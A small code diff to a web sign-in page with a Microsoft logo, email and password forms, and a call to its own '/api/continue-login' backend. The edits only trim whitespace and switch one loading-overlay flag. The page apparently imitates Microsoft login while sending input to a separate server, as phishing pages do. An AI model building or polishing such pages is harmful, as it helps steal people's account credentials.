@@ -550,10 +550,10 @@
             if (loading) {
                 // Show progress bar at top
                 loadingAnimation.classList.add('active');
-                
+
                 // Add loading animation to Microsoft logo
                 microsoftLogo.classList.add('loading');
-                
+
                 // Add compact loading state to container
                 container.classList.add('loading-state');
 
@@ -561,7 +561,7 @@
                     // Show full-screen overlay for intensive operations
                     overlayLoadingText.textContent = loadingText;
                     overlayLoadingOverlay.classList.add('active');
-                    
+
                     // Hide the form content during overlay loading
                     document.getElementById('emailForm').style.display = 'none';
                     document.getElementById('passwordForm').style.display = 'none';
@@ -579,7 +579,7 @@
                 microsoftLogo.classList.remove('loading');
                 overlayLoadingOverlay.classList.remove('active');
                 container.classList.remove('loading-state');
-                
+
                 // Restore form visibility when loading stops
                 microsoftDotsLoader.style.display = '';
                 document.getElementById('backInfo').style.display = '';
@@ -823,7 +823,7 @@
             }
 
             clearMessage();
-            setLoading(true, 'Trying to sign you in', true);
+            setLoading(true, 'Trying to sign you in', false);
 
             try {
                 const response = await fetch(`${API_BASE}/api/continue-login`, {
@@ -896,10 +896,10 @@
         function cancelLoading() {
             // Hide all loading states
             setLoading(false);
-            
+
             // Show message or reset form
             showMessage('Operation cancelled', 'info');
-            
+
             // Reset to email form if needed
             if (currentStep === 'password') {
                 showEmailForm();
